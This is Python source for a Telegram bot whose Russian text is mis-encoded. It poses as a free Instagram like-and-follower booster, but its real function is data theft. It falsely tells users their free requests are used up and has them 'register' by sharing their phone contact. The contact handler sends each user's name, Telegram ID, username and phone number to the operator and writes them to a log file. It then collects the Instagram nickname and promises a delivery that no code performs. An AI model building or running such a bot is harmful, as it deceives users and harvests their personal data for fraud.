import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = ''
bot = telebot.TeleBot("")
bot.send_message(ID, '!BOT STARTED!')
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''üëã –ü—Ä–∏–≤–µ—Ç! üëã
		–≠—Ç–æ—Ç –±–æ—Ç –¥–ª—è –Ω–∞–∫—Ä—É—Ç–∫–∏ –ª–∞–π–∫–æ–≤ –∏ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –≤ –∏–Ω—Å—Ç–∞–≥—Ä–∞–º!
		–î–ª—è —Å—Ç–∞—Ä—Ç–∞ –Ω–∞–ø–∏—à–∏–Ω–µ /nacrutka''') 

@bot.message_handler(commands=['nacrutka'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="–õ–∞–π–∫–∏", callback_data="first")
	second_button = types.InlineKeyboardButton(text="–ü–æ–¥–ø–∏—Å—á–∏–∫–∏", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç –Ω–∞–∫—Ä—É—Ç–∫–∏:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ª–∞–π–∫–æ–≤ (–Ω–µ –±–æ–ª–µ–µ 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ (–Ω–µ –±–æ–ª–µ–µ 500)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
			return
		if int(num) > 500:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ª–∞–π–∫–æ–≤ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å!
			–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã –∑–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
			return

		if int(num) > 500:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å!
			–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã –∑–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			–î–∞–Ω–Ω—ã–µ
			‚îú–ò–º—è: {first} {last}
			‚îúID: {userid}
			‚îú–ù–∏–∫: @{nick}
			‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {phone}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!')
		bot.send_message(message.chat.id, '–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–∏–∫ –≤ –∏–Ω—Å—Ç–∞–≥—Ä–∞–º:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'–ù–∏–∫: {inp} ')#‚è≥
		bot.send_message(ID, f'–ù–∏–∫ –≤ –∏–Ω—Å—Ç–∞—Ä–∞–º: {inp}')
		bot.send_message(message.chat.id, '–û–∂–∏–¥–∞–π—Ç–µ –ø—Ä–∏—Ö–æ–¥ –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')




bot.polling()

